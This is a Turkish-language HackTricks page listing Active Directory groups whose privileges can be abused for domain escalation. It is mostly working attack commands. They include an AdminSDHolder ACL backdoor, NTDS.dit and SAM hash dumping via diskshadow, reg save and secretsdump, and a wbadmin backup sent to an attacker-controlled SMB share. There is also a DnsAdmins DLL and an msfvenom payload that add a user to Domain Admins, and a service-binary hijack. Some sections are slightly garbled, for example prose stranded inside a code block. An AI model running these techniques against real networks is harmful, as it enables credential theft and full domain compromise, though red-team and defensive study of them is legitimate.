# Ayrıcalıklı Gruplar

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Yönetici ayrıcalıklarına sahip bilinen gruplar

* **Yöneticiler**
* **Alan Yöneticileri**
* **Kurumsal Yöneticiler**

## Hesap Operatörleri

Bu grup, etki alanında yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Etki Alanı Denetleyicisine (DC) yerel oturum açmayı etkinleştirir.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklemek ve DC01'e yerel giriş yapmak izinlidir.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Erişim Kontrol Listesi (ACL), Active Directory'deki tüm "korunan gruplar" için izinleri belirleyen önemli bir mekanizmadır, yüksek ayrıcalıklı gruplar da dahil. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek bir standart kullanıcıya tam izinler verebilir. Bu, bu kullanıcıya tüm korunan gruplar üzerinde tam kontrol sağlar. Bu kullanıcının izinleri değiştirilse veya kaldırılsa bile, sistem tasarımı gereği bir saat içinde otomatik olarak yeniden yüklenir.

Üyeleri incelemek ve izinleri değiştirmek için kullanılan komutlar:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Kurtarma sürecini hızlandırmak için bir komut dosyası mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla ayrıntı için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.

## AD Geri Dönüşüm Kutusu

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir ve hassas bilgileri ortaya çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Erişim Denetleyicisi Erişimi

Kullanıcının DC üzerindeki dosyalara erişimi kısıtlıdır, ancak kullanıcı `Server Operators` grubunun bir parçasıysa erişim düzeyi değişir.

### Ayrıcalık Yükseltme

Sysinternals'ten `PsService` veya `sc` kullanarak hizmet izinlerini inceleyip değiştirebilirsiniz. Örneğin, `Server Operators` grubu belirli hizmetler üzerinde tam kontrol sahibidir, bu da keyfi komutların yürütülmesine ve ayrıcalık yükseltmeye olanak tanır:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators`'ün tam erişime sahip olduğunu ortaya çıkarır ve böylece yükseltilmiş ayrıcalıklar için hizmetlerin manipülasyonunu mümkün kılar.

## Yedek Operatörleri

`Yedek Operatörleri` grubuna üyelik, `DC01` dosya sistemi erişimini `SeBackup` ve `SeRestore` ayrıcalıkları sayesinde sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanarak, açık izinler olmadan bile klasör gezinme, listeleme ve dosya kopyalama yetenekleri sağlar. Bu işlem için belirli komut dosyalarının kullanılması gerekmektedir.

Grup üyelerini listelemek için şunu çalıştırın:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar kullanılır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` yetkisini etkinleştirin ve doğrulayın:

```plaintext
1. Yönetici olarak oturum açın.
2. Başlat menüsünden "Local Security Policy" (Yerel Güvenlik Politikası) uygulamasını açın.
3. "Local Policies" (Yerel Politikalar) altında "User Rights Assignment" (Kullanıcı Hakları Ataması) seçeneğini bulun ve tıklayın.
4. Sağ panelde, "Backup files and directories" (Dosyaları ve dizinleri yedekle) öğesini bulun ve çift tıklayın.
5. "Local Security Setting" (Yerel Güvenlik Ayarları) penceresinde, "Add User or Group" (Kullanıcı veya Grup Ekle) düğmesine tıklayın.
6. "Select Users or Groups" (Kullanıcıları veya Grupları Seç) penceresinde, "Advanced" (Gelişmiş) düğmesine tıklayın.
7. "Find Now" (Şimdi Bul) düğmesine tıklayın ve "Administrators" (Yöneticiler) grubunu seçin.
8. "OK" düğmesine tıklayın ve "Apply" (Uygula) düğmesine tıklayarak değişiklikleri kaydedin.
9. "OK" düğmesine tıklayarak pencereyi kapatın.
10. Bilgisayarı yeniden başlatın.
11. `whoami /priv` komutunu kullanarak `SeBackupPrivilege` yetkisinin etkinleştirildiğini doğrulayın.
```

Bu adımları takip ederek `SeBackupPrivilege` yetkisini etkinleştirebilir ve doğrulayabilirsiniz.
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlere erişim sağlayın ve dosyaları kopyalayın, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Erişim kontrolü doğrudan Etki Alanı Denetleyicisi'nin dosya sistemine izin verir ve bu da tüm etki alanı kullanıcıları ve bilgisayarları için NTLM karma değerlerini içeren `NTDS.dit` veritabanının çalınmasına olanak sağlar.

#### diskshadow.exe Kullanarak

1. `C` sürücüsünün bir gölge kopyasını oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Gölge kopyasından `NTDS.dit` dosyasını kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash alımı için `SYSTEM` ve `SAM` dosyalarını çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` dosyasından tüm karma değerlerini alın:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe Kullanımı

1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemi kurulumu yapın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeklemesi ve `NTDS.dit` çıkarma için `wbadmin.exe` kullanın:
```cmd
net use X: \\<SaldırganIP>\paylaşadı /user:smbkullanıcı şifre
echo "Y" | wbadmin start backup -backuptarget:\\<SaldırganIP>\paylaşadı -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<tarih-saat> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için [IPPSEC İLE DEMO VİDEOYA](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) bakın.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, genellikle Etki Alanı Denetleyicilerinde barındırılan bir DNS sunucusunda SYSTEM ayrıcalıklarıyla keyfi bir DLL yükleyebilir ve bu yetenek önemli bir istismar potansiyeli sunar.

DnsAdmins grubunun üyelerini listelemek için kullanın:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Keyfi DLL Yürütme

Üyeler, DNS sunucusunun yerel olarak veya uzaktan paylaşımdan isteğe bağlı bir DLL yüklemesini sağlayabilirler. Bunun için aşağıdaki gibi komutlar kullanılabilir:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS hizmetini yeniden başlatmak (ek izin gerektirebilir) DLL'nin yüklenmesi için gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Bu saldırı vektörü hakkında daha fazla ayrıntı için ired.team'a başvurun.

#### Mimilib.dll
Komut yürütme için mimilib.dll kullanmak da mümkündür, özel komutları veya ters kabukları yürütmek için değiştirilebilir. Daha fazla bilgi için [bu yayına](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) bakın.

### WPAD Kaydı için MitM
DnsAdmins, küresel sorgu engelleme listesini devre dışı bıraktıktan sonra WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Responder veya Inveigh gibi araçlar, sahtelemeyi ve ağ trafiğini yakalamayı sağlamak için kullanılabilir.

### Olay Günlüğü Okuyucuları
Üyeler olay günlüklerine erişebilir ve potansiyel olarak düz metin şifreleri veya komut yürütme ayrıntıları gibi hassas bilgiler bulabilirler:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows İzinleri
Bu grup, etki alanı nesnesindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıklarını sağlayabilir. Bu grup tarafından istismar edilen ayrıcalık yükseltme teknikleri Exchange-AD-Privesc GitHub deposunda detaylı olarak açıklanmıştır.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Yöneticileri
Hyper-V Yöneticileri, Hyper-V'ye tam erişime sahiptir ve bu, sanallaştırılmış Etki Alanı Denetleyicileri üzerinde kontrol elde etmek için kullanılabilir. Bu, canlı DC'leri klonlamak ve NTDS.dit dosyasından NTLM karma değerlerini çıkarmak anlamına gelir.

### Sömürü Örneği
Firefox'un Mozilla Bakım Servisi, Hyper-V Yöneticileri tarafından SYSTEM olarak komutları yürütmek için sömürülebilir. Bu, korumalı bir SYSTEM dosyasına bir sert bağlantı oluşturmayı ve onu kötü amaçlı bir yürütülebilir dosya ile değiştirmeyi içerir:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Not: Hard link saldırısı, son Windows güncellemeleriyle önlenmiştir.

## Organization Management

**Microsoft Exchange**'in kullanıldığı ortamlarda, **Organization Management** adı verilen özel bir grup önemli yeteneklere sahiptir. Bu grup, **tüm alan kullanıcılarının posta kutularına erişim** hakkına sahiptir ve **'Microsoft Exchange Güvenlik Grupları'** Organizasyon Birimi (OU) üzerinde **tam kontrol** sağlar. Bu kontrol, ayrıcalık yükseltme için kullanılabilecek **`Exchange Windows İzinleri`** grubunu da içerir.

### Ayrıcalık Kullanımı ve Komutlar

#### Yazıcı Operatörleri
**Yazıcı Operatörleri** grubunun üyeleri, **`SeLoadDriverPrivilege`** dahil olmak üzere birkaç ayrıcalığa sahiptir. Bu ayrıcalıklar, **bir Etki Alanı Denetleyicisine yerel olarak oturum açma**, onu kapatma ve yazıcıları yönetme izni verir. Bu ayrıcalıkları sömürmek için özellikle **`SeLoadDriverPrivilege`** bir yükseltilmemiş bağlamda görünmüyorsa, Kullanıcı Hesabı Denetimi (UAC) atlatılması gerekmektedir.

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
**`SeLoadDriverPrivilege`** ile ilgili daha detaylı saldırı teknikleri için, belirli güvenlik kaynaklarına başvurulmalıdır.

#### Uzak Masaüstü Kullanıcıları
Bu grubun üyeleri, Uzak Masaüstü Protokolü (RDP) aracılığıyla PC'lere erişim izni verilir. Bu üyeleri sıralamak için PowerShell komutları kullanılabilir:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi sömürme konusunda daha fazla bilgi, ayrılmış pentesting kaynaklarında bulunabilir.

#### Uzaktan Yönetim Kullanıcıları
Üyeler, Windows Uzaktan Yönetim (WinRM) üzerinden PC'lere erişebilir. Bu üyelerin sıralaması şu şekilde gerçekleştirilir:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**Sunucu Operatörleri**
Bu grup, Etki Alanı Denetleyicileri üzerinde çeşitli yapılandırmalar yapma iznine sahiptir, bunlar arasında yedekleme ve geri yükleme yetkileri, sistem saati değiştirme ve sistemi kapatma bulunur. Üyeleri sıralamak için kullanılan komut:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referanslar <a href="#referanslar" id="referanslar"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>AWS hackleme hakkında sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.

</details>
